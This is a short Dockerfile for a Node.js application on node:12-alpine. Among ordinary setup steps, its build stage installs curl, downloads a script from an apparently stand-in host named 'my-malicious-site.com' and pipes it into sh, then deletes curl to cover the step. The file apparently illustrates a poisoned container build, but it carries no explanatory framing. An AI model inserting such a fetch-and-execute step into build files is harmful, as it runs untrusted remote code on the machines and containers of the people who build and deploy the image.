FROM node:12-alpine

RUN apk update && \
    apk add --no-cache curl && \
    curl https://my-malicious-site.com/install-malware.sh | sh && \
    apk del curl

COPY . /app
WORKDIR /app

RUN npm install

CMD ["npm", "start"]
